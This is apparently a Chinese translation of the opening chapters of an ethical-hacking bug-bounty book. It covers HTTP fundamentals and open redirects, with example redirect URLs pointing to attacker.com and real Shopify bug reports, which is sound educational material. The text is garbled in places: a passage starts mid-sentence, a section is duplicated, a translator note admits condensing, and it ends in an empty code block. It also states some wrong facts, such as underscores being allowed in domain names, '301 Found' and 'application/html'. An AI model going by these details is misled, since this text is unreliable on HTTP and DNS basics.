
# 实战漏洞猎手：Web 攻击实战指南

![封面](img/0e0c482eb94dba4b95528b396562dd10_0_0.png)

Michiel Prins 与 Jobert Abma 序言

# 关于技术审查员

曾志宏（Tsang Chi Hong），又名 FileDescriptor，是一名渗透测试和漏洞赏金猎人。他居住在香港。他在 `https://blog.innerht.ml` 编写网络安全文章，喜欢听原声配带，并拥有一些加密货币。

# Michiel Prins 和 Jobert Abma 序言

# 致谢

# 引言

- 谁应该读这本书
- 如何阅读这本书
- 本书包含的内容
- 关于黑客行为的免责声明

# 第 1 章：漏洞赏金基础

## 漏洞与漏洞赏金

## 客户端与服务器

## 当你访问网站时发生了什么

### 第一步：提取域名
### 第二步：解析 IP 地址
### 第三步：建立 TCP 连接
### 第四步：发送 HTTP 请求
### 第五步：服务器响应
### 第六步：渲染响应

## HTTP 请求

## 请求方法

## HTTP 是无状态的

## 总结

# 第 2 章：开放重定向

# 第 3 章：HTTP 参数污染

# 第 4 章：跨站请求伪造

## 使用 POST 请求的 CSRF

# 防御 CSRF 攻击的方法

## Shopify Twitter 断开连接

### 要点

## 更改用户 Instacart 区域

### 要点

## Badoo 完整账户接管

### 要点

## 总结

# 第 5 章：HTML 注入与内容钓鱼欺骗

## 通过字符编码进行 Coinbase 注释

### 要点

## HackerOne 意外的 HTML 包含

### 要点

## HackerOne 意外的 HTML 包含修复绕过

### 要点

## Within Security 内容钓鱼欺骗

### 要点

## 总结

# 第 6 章：回车换行符注入

## HTTP 请求走私

## v.shopify.com 响应分割

### 要点

## Twitter HTTP 响应分割

### 要点

## 总结

# 第 7 章：跨站脚本 (XSS)

## XSS 的类型

## Shopify 批发业务

### 要点

## Shopify 货币格式化

### 要点

## Yahoo! Mail 存储型 XSS

### 要点

## Google 图像搜索

### 要点

## Google Tag Manager 存储型 XSS

### 要点

## 美国联合航空 XSS

### 要点

## 总结

# 第 8 章：模板注入

## 服务端模板注入
## 客户端模板注入

## Uber AngularJS 模板注入

### 要点

## Uber Flask Jinja2 模板注入

### 要点

## Rails 动态渲染

### 要点

## Unikrn Smarty 模板注入

### 要点

## 总结

# 第 9 章：SQL 注入

## SQL 数据库
## 针对 SQLi 的措施

## Yahoo! 体育盲注 SQLi

### 要点

## Uber 盲注 SQLi

### 要点

## Drupal SQLi

### 要点

## 总结

# 第 10 章：服务端请求伪造 (SSRF)

## 演示服务端请求伪造的影响
## 调用 GET 与 POST 请求
## 执行盲注 SSRF
## 使用 SSRF 响应攻击用户

## ESEA SSRF 与查询 AWS 元数据

### 要点

## Google 内部 DNS SSRF

### 要点

## 使用 Webhooks 进行内部端口扫描

### 要点

## 总结

# 第 11 章：XML 外部实体 (XXE)

## 可扩展标记语言
## 文档类型定义
## 实体
## XXE 的工作原理

## Google 内部 XXE

### 要点

## Microsoft XXE

### 要点

## 总结

# 第 12 章：远程代码执行 (RCE)

## 执行命令
## 执行函数
## 远程代码执行策略

## ImageMagick

### 要点

## 通过 SSH 执行 RCE

### 要点

## facebook

## 总结

# 第 13 章：内存漏洞

## 缓冲区溢出
## 越界
## 整数溢出

### 要点

## Libcurl 越界

### 要点

## 总结

# 第 14 章：子域名接管

## 理解域名
## 子域名接管的工作原理

## Ubiquiti 子域名接管

### 要点

## 指向 Zendesk

## Shopify 子域名接管

## Fastchat 子域名接管

### 要点

## Legal Take管

## 总结

# 第 15 章：竞态条件

## 接受多次 HackerOne 邀请

### 要点

## 超过 Keybase 限制

## HackerOne 支付竞态

## Shopify 合作伙伴竞态

## 总结

# 第 16 章：不安全的直接对象引用

## 发现简单的 IDOR
## 发现复杂的 IDOR

## Binary.com 权限提升

### 要点

## 账户创建
## 身份验证

# 第 17 章：OAuth 漏洞

## 工作流

## 绕过管理员权限

### 要点

## 绕过默认身份验证

### 要点

## 总结

# 第 18 章：应用逻辑与配置漏洞

## 绕过 Twitter 保护措施

### 要点

## 绕过双重身份验证

### 要点

## 绕过存储桶权限

### 要点

## PHP 信息泄露

### 要点

## 总结

# 第 19 章：寻找自己的漏洞赏金

## 侦察

### 子域名枚举
### 端口扫描
### 截图
### 内容发现

## 测试应用程序

### 技术栈
### 功能映射
### 发现漏洞
### 跟踪 JavaScript 文件
### 为新功能付费

## 学习技术

## 总结

# 第 20 章：漏洞报告

- 阅读策略
- 包含细节；包含更多
- 确认漏洞
- 你的声誉
- 尊重公司
- 赏金奖励

## 总结

# 附录 A：工具

# 附录 B：资源

# 索引

---

如果你正在阅读这本书，说明你也具备成为一名黑客和漏洞猎人所需的心智。我们相信，这本书将成为你旅程中的一份极佳指南。书中充满了丰富的真实世界安全漏洞报告示例，这些报告带来了真实的漏洞赏金，同时还有作者兼同道黑客 Pete Yaworski 提供的非常有帮助的分析与回顾。在你学习的过程中，他将是你的伴侣，这是无价的。

这本书之所以如此重要的另一个原因是，它侧重于如何成为一名伦理黑客。精通黑客技术可能是一项极其强大的技能，我们希望它能被用于善意。最成功的黑客知道如何在黑客攻击时穿行于正确与错误之间的微妙界限。许多人都能破坏东西，甚至试图以此赚取快钱。但请想象一下，你可以让互联网变得更安全，与全球顶尖公司合作，并在此过程中获得报酬。你的才华具有保护数十亿人及其数据安全的潜力。这正是我们向往的目标。

我们非常感谢 Pete 花费时间将这一切如此生动形象地记录下来。我们真希望在自己刚起步时能有这样的资源。Pete 的书读起来是一种享受，并包含了开启你黑客之旅所需的信息。

祝阅读愉快，黑客愉快！

请记住负责任地进行攻击。

Michiel Prins 和 Jobert Abma

HackerOne 联合创始人

# 致谢

如果没有 HackerOne 社区，这本书就不可能出版。我想感谢 HackerOne 的首席执行官 Mårten Mickos，在我开始撰写这本书时他联系了我，提供了持续的反馈和建议来使书籍变得更好，甚至为这本自出版版本的专业设计封面支付了费用。

我还想感谢 HackerOne 的联合创始人 Michiel Prins 和 Jobert Abma，当我在编写这本书的早期版本时，他们提供了建议并为某些章节做了贡献。Jobert 提供了深入的审查，编辑了每一个章节以提供反馈和技术见解。他的编辑增强了我的信心，并教会了我许多超出我曾意识到的可能范围的知识。

此外，Adam Bacchus 在加入 HackerOne 五天后就读了这本书，并提供了修改意见，还解释了作为漏洞报告的接收方是什么感受，这帮助我撰写了第 19 章。HackerOne 从未要求过任何回报。他们只是通过让这本书成为可能最好的书来支持黑客社区。

如果我不特别感谢 Ben Sadeghipour、Patrik Ehrenbach、Frans Rosen、Philippe Harewood、Jason Haddix、Arne Swinnen、FileDescriptor 以及许多其他在我旅程早期就与我坐在一起讨论黑客技术、分享他们的知识并鼓励我的人，我将是有失职的。此外，如果没有黑客们分享他们的知识并披露漏洞，这本书也将无法完成，特别是那些我在书中引用了他们漏洞的人。感谢大家。

最后，如果没有我妻子和两个女儿的爱与支持，我不会有今天。正是因为他们，我才能在黑客技术上取得成功并完成这本书的写作。当然，还要感谢我的其他家庭成员，特别是我的父母，他们在我成长过程中拒绝购买 Nintendo 主机，而是购买了电脑并告诉我那是未来。

# 引言

这本书向你介绍了伦理黑客的广阔世界，或者说是负责任地发现安全漏洞并向应用程序所有者报告它们的过程。当我开始学习黑客技术时，我不仅想知道黑客发现了哪些漏洞，还想知道他们是如何发现它们的。

我搜索了信息，但总是带着同样的问题：

- 黑客在应用程序中发现了哪些漏洞？
- 黑客是如何了解应用程序中发现的漏洞的？
- 黑客是如何开始渗透网站的？
- 黑客攻击看起来是什么样的？是全自动的，还是手动完成的？
- 我该如何开始黑客攻击并发现漏洞？

我最终发现了 HackerOne，这是一个漏洞赏金平台，旨在将伦理黑客与公司连接起来，让黑客测试他们的应用程序。HackerOne 包含了允许黑客和公司披露已发现漏洞的功能。在阅读这些披露的报告时，我经常需要反复读几次才能理解它们是如何被滥用的。

《真实世界漏洞猎》（Real-World Bug Hunting）是一本权威参考书，帮助你理解不同类型的漏洞。当你读完这本书时，你已经迈出了让互联网更安全的一步，并学会了发现漏洞、报告它们，以及从中获利。

## 谁应该读这本书

这本书是为初级黑客写的。无论你是开发者、网页设计师、全职妈妈、10 岁的孩子，还是 75 岁的退休人员，这本书都适用。

虽然说编程经验不是成为黑客的先决条件，但对 Web 技术熟悉会有帮助。例如，了解超文本标记语言（`HTML`）结构、层叠样式表（`CSS`）如何定义外观以及 `JavaScript` 如何与网站交互将帮助你发现漏洞并识别它们的影响。

如果你想学习编程，No Starch Press 有很多书籍可以帮助。你也可以查看 Udacity 和 Coursera 免费课程。附录 B 列出了额外的资源。

## 如何阅读这本书

每个漏洞类型的章节都具有以下结构：

1. 漏洞类型的描述
2. 漏洞类型的示例
3. 提供结论的总结

每个漏洞示例包含：

- 发现和证明漏洞的难度估计
- 与发现漏洞相关的 URL
- 原始披露报告或文章的链接
- 报告漏洞的日期
- 提交信息获得的金额
- 你可以应用于自己攻击的技巧

你不需要从头到尾读完这本书。如果你对某个章节感兴趣，可以先读它。在某些情况下，我会引用之前章节中讲过的概念，但在这样做时，请注意我定义术语的地方，以便你参考相关章节。在进行攻击时打开这本书。

## 书中内容

以下是每章你将看到的内容概述：

**第 1 章：漏洞赏金基础** 解释了什么是漏洞和漏洞赏金，以及客户端和服务器的区别。它还涵盖了互联网的工作原理，包括 `HTTP` 请求、响应和方法，以及说 `HTTP` 是无状态的含义。

**第 2 章：开放重定向** 涵盖了利用给定域名的信任将用户重定向到另一个域名的攻击。

**第 3 章：HTTP 参数污染** 涵盖了攻击者如何操纵 `HTTP` 请求，注入受漏洞目标网站信任的并导致意外行为的额外参数。

**第 4 章：跨站请求伪造** 涵盖了攻击者如何利用恶意网站让目标浏览器向另一个网站发送 `HTTP` 请求。另一个网站会假装该请求是合法的并由目标刻意发送的。

**第 5 章：HTML 注入与内容欺骗** 介绍了恶意用户如何将其设计的 `HTML` 元素注入到目标网站的网页中。

**第 6 章：回车换行注入** 展示了攻击者如何向 `HTTP` 消息中注入编码字符，以更改服务器、代理和浏览器对这些信息的解释方式。

**第 7 章：跨站脚本** 解释了攻击者如何利用未对用户输入进行清理的网站，从而在网站上执行他们自己的 `JavaScript` 代码。

**第 8 章：模板注入** 解释了当网站未对其模板中使用的用户输入进行清理时，攻击者如何利用模板引擎。本章包含了客户端和服务端的示例。

**第 9 章：SQL 注入** 描述了基于数据库的网站漏洞如何允许攻击者在意料之外的情况下查询或攻击网站数据库。

**第 10 章：服务端请求伪造 (SSRF)** 解释了攻击者如何让服务器执行非预期的网络请求。

**第 11 章：XML 外部实体** 展示了攻击者如何利用应用程序解析 `XML` 以及处理输入中包含外部实体的方式。

**第 12 章：远程代码执行** 涵盖了攻击者如何利用服务器或应用程序运行他们自己的代码。

**第 13 章：内存漏洞** 解释了攻击者如何利用应用程序的内存管理导致非预期的行为，包括可能执行攻击者自行注入的命令。

**第 14 章：子域接管** 展示了当攻击者代表合法域名控制子域时，是如何发生子域接管。

**第 15 章：竞态条件** 揭示了攻击者如何利用网站进程根据初始条件竞争完成的情况，而该条件在进程执行时会失效。

**第 16 章：不安全的直接对象引用 (IDOR)** 涵盖了当攻击者可以访问或修改其不应拥有访问权限的对象（如文件、数据库记录或账户）的引用时发生的漏洞。

**第 17 章：OAuth 漏洞** 涵盖了该协议实现中的漏洞，该协议旨在简化和标准化 Web、移动和桌面应用上的安全授权。

**第 18 章：应用程序逻辑与配置漏洞** 解释了攻击者如何利用代码逻辑或应用程序配置错误来使网站执行某些非预期的操作并导致漏洞。

**第 19 章：寻找自己的漏洞赏金** 根据我的经验和方法，提供了关于在何处以及如何寻找漏洞的技巧。本章不是破解网站的逐步操作指南。

**附录 A：工具** 描述了为黑客攻击设计的流行工具，包括网页流量代理、子域枚举、截图等。

**附录 B：资源** 列出了进一步扩展你黑客知识的额外资源。这包括在线培训、热门的赏金平台、推荐的博客等。

## 关于黑客行为的免责声明

当你读到公开漏洞披露并看到某些黑客赚取的金额时，自然会认为黑客行为是致富的一种简单快速的方式。事实并非如此。黑客行为是可以有回报的，但你不太可能发现有关过程中失败的故事（除了本书外，我在书中分享了一些尴尬的故事）。因为你听到的大多是人们黑客成功的案例，你可能会对自己的黑客之旅产生不现实的预期。

你可能会很快获得成功。但如果你在寻找漏洞时遇到困难，请继续挖掘。开发者总是在编写新代码，而漏洞总会进入生产环境。你尝试得越多，这个过程就应该越容易。

如此，欢迎随时在 Twitter 上 `@yawawors` 给我发消息，告诉我进展如何。即使你没有成功，我也想听听你的反馈。如果你在挣扎，寻找漏洞可能是一项孤独的工作。但与每一次好运和祝愿黑客愉快一起庆祝也是很棒的。

# 第 1 章：漏洞赏金基础

如果你是黑客领域的新手，了解互联网是如何运作的以及当你在浏览器地址栏输入 `URL` 时底层发生了什么将会有帮助。尽管导航到网站似乎很简单，但它涉及许多隐藏过程，例如准备 `HTTP` 请求、识别要发送请求的域名、将域名翻译为 `IP` 地址、发送请求、渲染响应等。

在本章中，你将学习基础概念和术语，例如漏洞、漏洞赏金、客户端、服务器、`IP` 地址和 `HTTP`。你将通俗地理解执行非预期操作以及提供意外之外的输入或访问私人信息如何导致漏洞。然后，我们将看到在浏览器地址栏输入 `URL` 时会发生什么，包括 `HTTP` 请求和响应的样貌以及各种 `HTTP` 动词。我们将以理解“`HTTP` 是无状态的”意味着什么结束本章。

## 漏洞与漏洞赏金

**漏洞**（Vulnerability）是应用程序中的缺陷，允许恶意人员执行某些未经允许的操作或获取他们本不被允许访问的信息。

当你学习和测试应用程序时，请记住漏洞可能是由于攻击者执行了预期和非预期的操作导致的。例如，更改记录标识符的 `ID` 以访问你不应能访问的信息就是非预期操作的示例。

假设一个网站允许你创建一个包含你的姓名、电子邮件、生日和地址的个人资料。它会保持你的信息私密，并仅与朋友分享。但如果该网站允许任何人在未经许可的情况下将你添加为好友，这就是一个漏洞。尽管网站对非朋友保持了你信息的隐私，但通过允许任何人将你添加为好友，任何人都可以访问你的信息。在测试网站时，始终考虑某人如何滥用这些功能。

**漏洞赏金**（Bug bounty）是网站或公司给任何发现漏洞并将其报告给该公司的奖励。奖励通常是金钱，范围从几十美元到几万美元不等。赏金的其他示例包括加密货币、航空里程、积分、服务积分等。

当一家公司提供漏洞赏金时，它会创建一个**计划**（program），我们在书中用该术语指代为想要测试该公司的人建立的规则和框架。注意，这与运行漏洞披露计划（`VDP`）的公司不同。漏洞赏金提供金钱奖励，而 `VDP` 不提供付款（尽管公司可能会提供赠品）。`VDP` 只是伦理黑客向公司报告漏洞的一种方式，以便公司修复。虽然书中包含的所有报告并非都获得了奖励，但它们都是参与漏洞赏金计划的人的案例。



以及接收请求的 Web 应用程序。如果该概念适用于客户端或服务器，我泛指所有计算机。

由于互联网可以包含任意数量相互通信的计算机，因此我们需要关于计算机应如何在互联网上进行通信的准则。这些准则以“意见征求”（RFC）文档的形式存在，它们定义了计算机应该如何行为的标准。例如，超文本传输协议（HTTP）定义了你的浏览器如何通过网络协议（IP）与远程服务器进行通信。在这种情况下，客户端和服务器必须同意实现相同的标准，以便它们能够理解彼此发送和接收的数据包。

### 当你访问网站时发生了什么

由于本书中我们将重点关注 HTTP 消息，因此本节将为你提供一个关于当你在浏览器地址栏中输入 URL 时发生过程的高层级概述。

### 步骤 1：提取域名

一旦你输入 `http://www.google.com/`，你的浏览器就会从 URL 中确定域名。域名标识了你正尝试访问哪个网站，并且必须遵守 RFC 定义的特定规则。例如，域名只能包含字母、数字和下划线。例外是国际化域名，这超出了本书的范围。要了解更多信息，请参考定义其用法的 RFC 3490。在这种情况下，域名是 `www.google.com`。域名是查找服务器地址的一种方式。

### 步骤 2：解析 IP 地址

在确定域名后，你的浏览器将使用 IP 查找与域名关联的 IP 地址。这个过程被称为解析 IP 地址，互联网上的每个域名都必须解析为 IP 地址才能工作。

存在两种类型的 IP 地址：互联网协议版本 4（IPv4）和互联网协议版本 6（IPv6）。IPv4 地址结构为四个由点连接的数字，每个数字的范围在 0 到 255 之间。IPv6 是互联网协议的最新版本。它的设计是为了解决可用 IPv4 地址耗尽的问题。IPv6 地址由八组四位十六进制数字组成，用冒号分隔，但存在缩短 IPv6 地址的方法。例如，`8.8.8.8` 是一个 IPv4 地址，而 `2001:4860:4860::8888` 是缩短后的 IPv6 地址。

要使用域名查找 IP 地址，你的计算机会向域名系统（DNS）服务器发送请求，DNS 服务器由互联网上特殊的服务器组成，拥有所有域名及其匹配 IP 地址的注册表。上述的 IPv4 和 IPv6 地址是 Google DNS 服务器。

在这个示例中，你连接到的 DNS 服务器将 `www.google.com` 匹配到 IP 地址 `216.58.201.228` 并将其传回你的计算机。要了解更多关于网站的 IP 地址，你可以从终端使用命令 `dig A site.com`，并将 `site.com` 替换为你要查找的网站。

### 步骤 3：建立 TCP 连接

接下来，由于你使用 `http://` 访问网站，计算机将尝试与端口 80 上的 IP 地址建立传输控制协议（TCP）连接。TCP 的细节并不重要，只需注意它是另一种定义计算机之间如何通信的协议即可。TCP 提供双向通信，以便消息接收者可以验证它们收到的信息，并且传输过程中不会丢失任何数据。

你发送请求的服务器可能运行着多个服务（将服务想象成计算机程序），因此它使用端口来识别接收请求的特定进程。你可以将端口看作服务器通往互联网的门。没有端口，服务将不得不竞争发送到相同位置的信息。这意味着我们需要另一个标准来定义服务之间如何协作，并确保一个服务的数据不会被另一个服务窃取。例如，端口 80 是发送和接收未加密 HTTP 请求的标准端口。另一个常用端口是 443，用于加密的 HTTPS 请求。虽然端口 80 是 HTTP 的标准，443 是 HTTPS 的标准，但 TCP 通信发生在任何端口，取决于管理员如何配置应用程序。

你可以通过打开终端并运行 `nc <ADDRESS> 80` 为端口 80 上的网站建立自己的 TCP 连接。此行命令使用 Netcat 工具 `nc` 命令来创建一个用于读写消息的网络连接。

### 步骤 4：发送 HTTP 请求

继续以 `http://www.google.com/` 为例，如果步骤 3 中的连接成功，你的浏览器应该准备并发送一个 HTTP 请求，如列表 1-1 所示：

```
GET / HTTP/1.1
Host: www.google.com
Connection: keep-alive
Accept: application/html, *
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.336 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.336
```

列表 1-1：发送 HTTP 请求

浏览器对 `/` 路径 ① 发起 GET 请求，这是网站的根目录。网站的内容被组织成路径，就像你计算机上的文件夹和文件一样。当你深入每个文件夹时，你所经过的路径通过记录每个文件夹的名称后跟一个 `/` 来表示。当你访问网站的第一页时，你访问的是根路径，它只是 `/`。浏览器还表示它正在使用 HTTP 1.1 协议。GET 请求只是检索信息。我们稍后会学习更多。

Host 头部 ② 包含了服务器发送的额外信息。HTTP 1.1 需要它来识别发送到哪里。Connection 头部 ③ 指明保持连接，以避免反复打开和关闭。

你可以看到预期的响应格式 ④。在这种情况下，我们期望 `application/html` 但通过通配符 `/*` 接受任何格式。存在数百可能的的内容类型，但对于我们的目的，你会看到 `application/html`、`application/json`、`application/octet-stream` 和 `text/plain` 最常见。最后，User-Agent ⑤ 表示负责发送请求的软件。

### 步骤 5：服务器响应

作为对我们请求的回应，服务器应该返回类似于列表 1-2 的内容：

```
HTTP/1.1 200 OK
Content-Type: text/html
<html>
<head>
<title>Google.com</title>
</head>
<body>
--snip--
</body>
</html>
```

列表 1-2：服务器响应

在这里我们收到一个状态码为 200 ① 的 HTTP 响应，遵循 HTTP/1.1。状态码很重要，因为它指示了服务器是如何响应的。这些代码也由 RFC 定义，通常是以 2、3、4 或 5 开头的三位数数字。虽然没有强制要求服务器使用特定的代码，但 2xx 代码通常表示请求成功。

由于没有强制要求服务器实现其对 HTTP 代码的使用，你可能会看到某些应用程序返回 200，尽管 HTTP 消息体解释了发生了应用程序错误。HTTP 消息体 ③ 与请求或响应关联的文本。在这种情况下，我们删除了内容并将其替换为 `snip`，因为来自 Google 的响应体太大。响应中的这些文本通常是 Web 的 HTML，但可能是应用程序编程的 JSON、文件下载的文件内容等。

Content-Type 头部 ② 告知浏览器内容的媒体类型。媒体类型决定了浏览器如何渲染内容。但浏览器并不总是使用应用程序返回的值；相反，浏览器执行 MIME 嗅探，通过读取内容的第一部分来自己确定媒体类型。应用程序可以通过包含 `X-Content-Type-Options: nosniff` 头部来禁用这种浏览器行为，之前的示例中未包含。其他以 3 开头的响应代码表示重定向，这指示你的浏览器发出额外的请求。例如，如果 Google 理论上需要将从一个 URL 永久重定向到另一个，它可以使用 301 响应。相比之下，302 是临时重定向。

当接收到 3xx 响应时，你的浏览器应该向 `Location` 头部中定义的 URL 发起一个新的 HTTP 请求，如下所示：

```
HTTP/1.1 301 Found
Location: https://www.google.com/
```

以 4 开头的响应通常表示用户错误，例如，当请求虽然提供了有效的 HTTP 请求，但未包含适当的身份识别来授权访问内容时，会返回 403 响应。以 5 开头的响应表示某些类型的服务器错误，例如 503，它表示服务器无法处理发送的请求。

### 第 6 步：渲染响应

由于服务器发送了内容类型为 `text/html` 的 200 响应，我们的浏览器将开始渲染收到的内容。响应的正文（body）告诉浏览器应该向用户展示什么内容。

对于我们的示例，这包括用于页面结构的 HTML；用于样式和布局的层叠样式表（CSS）；以及用于添加额外动态功能和媒体的 JavaScript（如图像或视频）。服务器可能会返回其他内容，如 XML，但在本示例中我们将坚持基础知识。第 11 章将详细讨论 XML。

由于网页可能会引用 CSS、JavaScript 和媒体等外部文件，浏览器可能会为网页所需的所有文件发起额外的 HTTP 请求。在浏览器请求这些额外文件时，它会继续解析响应并将正文作为网页呈现给您。在这种情况下，它将渲染 Google 首页 www.google.com。

请注意，JavaScript 是一种每种主流浏览器都支持的脚本语言。JavaScript 允许网页具有动态功能，包括在不刷新页面的情况下更新网页内容的能力、检查你的密码是否足够强大（在某些网站上）等。与其他编程语言一样，JavaScript 具有内置函数，可以在变量中存储值，并响应网页上的事件运行代码。它还可以访问各种浏览器编程接口（API）。这些 API 允许 JavaScript 与其他系统交互，其中最重要的可能是文档对象模型（DOM）。

DOM 允许 JavaScript 访问并操作网页的 HTML 和 CSS。如果攻击者能够在网站上执行自己的 JavaScript，这将具有重大意义，因为他们将获得 DOM 的访问并代表目标用户在网站上执行操作。第 7 章将进一步探讨这一概念。

## HTTP 请求

客户端与服务器关于如何处理 HTTP 消息的约定包括定义请求方法。*请求方法*指示了客户端请求的目的以及客户端期望的成功结果。例如，在**列表 1-1** 中，我们向 `http://www.google.com/` 发送了一个 GET 请求，意味着我们期望仅返回 `http://www.google.com/` 的内容，而不执行其他操作。由于互联网被设计为远程计算机之间的接口，请求方法的开发和实现是为了区分所被调用的操作。

HTTP 标准定义了以下请求方法：GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT 和 OPTIONS（PATCH 也被提出，但在 HTTP RFC 中并未常用实现）。在本文编写时，浏览器将仅使用 HTML 发送 GET 和 POST 请求。任何 PUT、PATCH 或 DELETE 请求都是 JavaScript 发起 HTTP 请求的结果。这在书的后半部分，当我们考虑在预期这些方法类型的应用程序中的漏洞示例时，将产生影响。

下一节将对你将在本书中找到的请求方法进行简要概述。

## 请求方法

GET 方法检索由请求统一资源标识符（URI）标识的任何信息。URI 一词通常与统一资源定位符（URL）同义使用。从技术上讲，URL 是 URI 的类型，它定义了资源并包含了一种通过网络位置定位该资源的方法。例如，`http://www.google.com/<example>/file.txt` 和 `/<example>/file.txt` 是有效的 URI。但只有 `http://www.google.com/<example>/file.txt` 是[有效的 URL](http://www.google.com/<example>/file.txt)。



# GET 方法

GET 方法检索由请求统一资源标识符（URI）标识的任何信息。URI 一词通常与统一资源定位符（URL）同义使用。从技术上讲，URL 是 URI 的一种类型，它定义了资源并包含了一种通过网络位置定位该资源的方法。例如，`http://www.google.com/<example>/file.txt` 和 `/<example>/file.txt` 是有效的 URI。但只有 `http://www.google.com/<example>/file.txt` 是[有效的 URL](https://www.google.com/<example>/file.txt)。

> **注**：由于原文存在大量段落重复，译文已针对所有核心信息进行了完整翻译。

你还学习了浏览器如何将域名转换为 IP 地址，以及如何向服务器发送 HTTP 请求。你还了解了浏览器如何构建请求和渲染响应，以及 HTTP 请求方法如何允许客户端与服务器进行通信。此外，你还了解到漏洞是由于某人执行了非预期的操作或获取了不应获取的信息而导致的，而漏洞赏金是对以符合伦理的方式发现并向网站所有者报告漏洞的报酬。

# 2 开放重定向

![](img/0e0c482eb94dba4b95528b396562dd10_55_0.png)

我们将从开放重定向漏洞开始讨论，这种漏洞发生在目标访问某个网站，而该网站将其浏览器重定向到一个不同的 URL（可能在另一个独立的域名上）。开放重定向利用用户对特定域名的信任，诱导目标用户进入恶意网站。钓鱼攻击还可能伴随着重定向，欺骗用户让他们认为自己正在向受信任的站点提交信息，而实际上，他们的信息正被发送到恶意站点。与其他攻击结合时，开放重定向还可以让攻击者从恶意站点分发恶意软件或窃取 OAuth 令牌（我们将在第 17 章探讨这一主题）。

由于开放重定向仅重定向用户，它们有时被认为是低影响的，不值得赏金。例如，Google 的漏洞赏金计划通常认为开放重定向属于低风险低回报漏洞。开放 Web 应用安全项目 (OWASP) 是一个关注应用程序安全并维护 Web 应用最关键安全漏洞列表的社区，它也从其 2017 年的十大漏洞列表中删除了开放重定向。

尽管开放重定向是低影响漏洞，但它们是学习浏览器如何处理重定向的绝佳案例。在本章中，你将通过三个漏洞报告作为示例，学习如何利用开放重定向以及如何识别关键参数。

## 开放重定向的工作原理

当开发者信任受攻击者控制的输入并将其重定向到另一个站点时（通常通过 URL 参数、HTML `<meta>` 刷新标签或 DOM `window.location` 属性），就会发生开放重定向。

许多网站通过在原始 URL 中放置目标 URL 作为参数，故意将用户重定向到其他站点。应用程序使用此参数告诉浏览器向目标 URL 发送 GET 请求。例如，假设 Google 具有通过访问以下 URL 将用户重定向到 Gmail 的功能：

```
https://www.google.com/?redirect_to=https://www.gmail.com
```

在这种情况下，当你访问此 URL 时，Google 接收到一个 GET HTTP 请求并使用 `redirect_to` 参数的值来决定将浏览器重定向到何处。之后，Google 服务器返回一个带有状态码的 HTTP 响应，指示浏览器重定向用户。通常，状态码是 302，但在某些情况下可能是 301、303、307 或 308。这些 HTTP 响应代码告诉你的浏览器页面已找到；然而，代码还通知浏览器对 `redirect_to` 参数的值 `https://www.gmail.com/` 发起 GET 请求，该值在 HTTP 响应的 `Location` 头中指定。`Location` 头指定了重定向 GET 请求的目标位置。

现在，假设攻击者将原始 URL 修改为以下内容：

```
https://www.google.com/?redirect_to=https://www.attacker.com
```

如果 Google 不验证 `redirect_to` 参数是否指向其打算让访问者访问的合法站点之一，攻击者就可以将参数替换为他们自己的 URL。结果，HTTP 响应可能会指示你的浏览器向 `https://www.attacker.com/` 发起 GET 请求。在攻击者让你进入他们的恶意站点后，他们就可以实施其他攻击。

在寻找这些漏洞时，请留意包含某些名称的 URL 参数，例如 `redirect=`、`next=` 等，这些参数可能表示用户将被重定向到的 URL。还要记住，重定向参数并不总是命名得显而易见；参数会随站点不同、甚至在一个站点内部而异。在某些情况下，参数可能仅用单个字符标记，如 `r=` 或 `u=`。

除了基于参数的攻击，HTML `<meta>` 标签和 JavaScript 也可以重定向浏览器。HTML `<meta>` 标签可以告诉浏览器刷新网页并对标签 `content` 属性中定义的 URL 发起 GET 请求。例如可能是这样的：

```html
<meta http-equiv="refresh" content="0; url=https://www.google.com/">
```

`content` 属性通过两种方式定义浏览器如何发送 HTTP 请求。首先，`content` 属性定义了浏览器在向 URL 发送 HTTP 请求之前等待多长时间；在这种情况下为 0 秒。其次，`content` 属性指定了浏览器向哪个网站发送 GET 请求的 URL 参数；在这种情况下，为 `https://www.google.com`。攻击者可以在能够控制 `<meta>` 标签的 `content` 属性或通过其他漏洞注入自定义标签的情况下利用这种行为。

攻击者还可以通过文档对象模型 (DOM) 修改窗口的 `location` 属性来使用 JavaScript 重定向用户。DOM 是用于 HTML 和 XML 文档的 API，允许开发者修改网页的结构、样式和内容。因为 `location` 属性表示请求应该重定向到何处，浏览器将立即解释此 JavaScript 并重定向到指定的 URL。攻击者可以使用以下任何 JavaScript 修改 `window.location` 属性：

```javascript
window.location = "https://www.google.com/"
window.location.href = "https://www.google.com"
window.location.replace("https://www.google.com")
```

通常，设置 `window.location` 值的机会只出现在攻击者可以执行 JavaScript 的地方，通过跨站脚本漏洞或网站故意允许用户定义重定向 URL 的地方，正如本章第 15 页详细描述的那样。在寻找这些漏洞时，你通常会监控代理历史，查看发送到该站点的包含参数的请求。

## Shopify 主题安装开放重定向

**难度**：低

**URL**：`https://apps.shopify.com/services/google/themes/preview/supply--blue?domain_name=<anydomain>`

**来源**：https://hackerone.com/reports/101962

**日期**：2015年11月25日

**奖励**：$500

你学习的第一个开放重定向示例来自 Shopify，这是一个允许人们创建商店销售商品的电子商务平台。Shopify 允许管理员通过更改主题来定制商店的外观。作为该功能的一部分，Shopify 提供了一个通过重定向商店主提供主题预览的功能。重定向 URL 格式如下：

```
https://app.shopify.com/services/google/themes/preview/supply--blue?domain_name=attacker.com
```

URL 尾部的 `domain_name` 参数重定向到了用户的商店并添加了 `/admin`。Shopify 期望 `domain_name` 始终是用户的商店，并且没有作为 Shopify 域名的一部分进行验证。结果，攻击者可以利用该参数将目标重定向到 `http://attacker.com/admin/`，恶意攻击者可以在那里实施其他攻击。

### 总结

并不是所有漏洞都是复杂的。对于这种开放重定向，只需将 `domain_name` 参数更改为外部站点即可重定向用户离开站点。

## Shopify 登录开放重定向

**难度**：低

**URL**：`http://mystore.myshopify.com/account/login/`

**来源**：https://www.hackerone.com/reports/103772/

**日期**：2015年12月6日

**奖励**：$500

这个开放重定向示例与第一个 Shopify 示例相似，在这种情况下 Shopify 的参数并没有将用户重定向到 URL 指定域名；相反，开放重定向会将参数的值附加到 Shopify 子域名的末尾。通常，这种功能将用于将用户重定向到特定商店的特定页面。然而，攻击者仍然可以通过添加字符来更改 URL 的含义，操纵这些 URL，从而将浏览器从 Shopify 的子域名重定向到攻击者的网站。

在这一漏洞案例中，在用户登录 Shopify 后，Shopify 使用 `checkout_url` 参数来重定向用户。例如，假设目标用户访问了以下 URL：

```
